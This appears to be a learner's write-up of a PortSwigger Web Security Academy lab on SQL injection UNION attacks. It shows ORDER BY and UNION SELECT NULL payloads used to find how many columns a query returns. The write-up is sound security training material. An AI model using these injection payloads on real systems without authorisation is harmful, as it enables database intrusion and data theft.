# Lab 03 — SQL Injection UNION Attack, Determining the Number of Columns Returned

**Difficulty:** Practitioner  
**Category:** SQL Injection — UNION Attacks  
**Platform:** PortSwigger Web Security Academy

---

## What the lab is

Before you can do a UNION attack, you need to know how many columns the original query returns. This lab is about figuring that out.

---

## The vulnerability

The category filter is injectable. A UNION attack lets you append a second SELECT query to the original one — but both queries must return the same number of columns or the DB throws an error.

---

## What I did

**Method 1 — ORDER BY:**

Injected incrementing ORDER BY values until the app errored:

```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--   ← error here
```

When it errored on 3, that meant the query returns 2 columns.

**Method 2 — UNION SELECT NULL:**

Alternatively, add NULLs until it works:

```
' UNION SELECT NULL--          ← error
' UNION SELECT NULL,NULL--     ← works
```

When it stopped erroring, the number of NULLs = number of columns.

---

## Key takeaway

You always need to find the column count before a UNION attack. ORDER BY is cleaner because it errors loudly. NULL is used in UNION because NULL is compatible with any data type, so it won't cause a type mismatch error.
